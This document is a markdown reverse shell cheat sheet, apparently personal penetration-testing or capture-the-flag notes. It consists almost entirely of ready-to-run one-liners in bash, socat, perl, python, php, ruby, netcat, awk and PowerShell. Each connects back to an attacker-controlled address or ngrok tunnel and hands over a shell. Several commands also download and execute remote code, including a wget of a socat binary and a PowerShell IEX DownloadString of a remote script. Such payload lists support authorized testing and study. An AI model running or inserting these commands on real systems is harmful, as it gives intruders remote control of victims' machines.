# Reverse Shell Cheat Sheet
## [tool](https://www.revshells.com/)
## bash
```console
kali@kali:~$ bash -i >& /dev/tcp/8.tcp.ngrok.io/18545 0>&1
kali@kali:~$ bash -c 'bash -i >& /dev/tcp/10.10.16.7/8888 0>&1'
kali@kali:~$ 0<&196;exec 196<>/dev/tcp/10.10.16.7/8888; sh <&196 >&196 2>&196
kali@kali:~$ /bin/bash -l > /dev/tcp/10.10.16.7/8888 0<&1 2>&1
kali@kali:~$ exec 5<> /dev/tcp/10.10.16.7/8888; cat <&5 | while read line; do $line 2>&5>&5; done
```
## [socat](https://github.com/thotrangyeuduoi/template/blob/master/note.md#socat)
```console
#local
kali@kali:~$ socat file:`tty`,raw,echo=0 TCP-L:8888
#target
kali@kali:~$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.7:8888
#binaryFile on target
kali@kali:~$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.7:8888
```
*[https://github.com/andrew-d/static-binaries]( https://github.com/andrew-d/static-binaries)*
## perl
```console
kali@kali:~$ perl -e 'use Socket;$i="10.10.16.7";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
kali@kali:~$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.7:8888");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
#NOTE: Windows only
C:\Users\offsec> perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.16.7:8888");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## python
```console
kali@kali:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
kali@kali:~$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
kali@kali:~$ python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
kali@kali:~$ export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
## php
```console
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
kali@kali:~$ php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
## ruby
```console
kali@kali:~$ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
kali@kali:~$ ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
#NOTE: Windows only
C:\Users\offsec> ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## netcat
```console
#Traditional
kali@kali:~$ nc -e /bin/sh 10.0.0.1 4242
kali@kali:~$ nc -e /bin/bash 10.0.0.1 4242
kali@kali:~$ nc -c bash 10.0.0.1 4242
#OpenBsd
kali@kali:~$ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
#BusyBox
kali@kali:~$ rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```
## awk
```console
kali@kali:~$ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## [powershell](https://github.com/thotrangyeuduoi/template/blob/master/note.md#PowerShell-Reverse-Shells)
```cmd
C:\Users\offsec> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
C:\Users\offsec> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
C:\Users\offsec> powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```